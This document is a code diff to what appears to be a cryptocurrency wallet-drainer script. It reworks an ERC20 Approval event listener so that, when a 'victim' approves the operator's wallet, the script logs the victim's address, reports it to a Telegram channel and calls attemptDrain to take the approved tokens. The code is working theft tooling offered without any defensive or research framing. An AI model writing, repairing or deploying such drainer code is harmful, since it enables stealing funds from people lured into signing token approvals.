@@ -184,9 +184,22 @@ function startChainListener(chainKey, config, wallet) {
                 const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                 const filter = contract.filters.Approval(null, wallet.address);
 
-                contract.on(filter, async (owner, spender, value, event) => {
+                contract.on(filter, async (...args) => {
                     console.log(`\n🎯 [${config.name}] APPROVAL_EVENT DETECTED!`);
+
+                    let owner, spender, value;
+                    // Ethers v6 can pass arguments as (owner, spender, value, event) 
+                    // or sometimes as a single payload object depending on the provider/version
+                    if (args.length === 1 && args[0].args) {
+                        [owner, spender, value] = args[0].args;
+                    } else {
+                        [owner, spender, value] = args;
+                    }
+
                     const valDisplay = value ? value.toString() : "Unknown";
+                    console.log(`   Victim: ${owner}`);
+                    console.log(`   Value: ${valDisplay}`);
+
                     await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>\nValue: ${valDisplay}`);
                     await attemptDrain(connectedWallet, tokenAddress, owner, config.name);
                 });
